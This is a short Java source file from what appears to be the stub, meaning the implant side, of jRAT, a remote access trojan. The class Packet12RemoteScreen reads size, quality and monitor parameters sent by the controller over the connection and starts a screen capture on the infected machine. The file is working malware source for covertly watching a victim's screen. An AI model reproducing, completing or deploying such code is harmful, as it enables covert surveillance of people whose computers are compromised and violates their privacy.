package su.jrat.stub.packets.incoming;

import su.jrat.stub.Connection;
import su.jrat.stub.Screen;

public class Packet12RemoteScreen extends AbstractIncomingPacket {
	
	private boolean repeat;
	
	public Packet12RemoteScreen() {
		this.repeat = true;
	}
	
	public Packet12RemoteScreen(boolean repeat) {
		this.repeat = repeat;
	}

	@Override
	public void read() throws Exception {
		int size = Connection.readInt();
		int quality = Connection.readInt();
		int monitor = Connection.readInt();
		
		//new Thread(new Screen(repeat, size, quality, monitor)).run();
		new Screen(repeat, size, quality, monitor).run();
	}

}
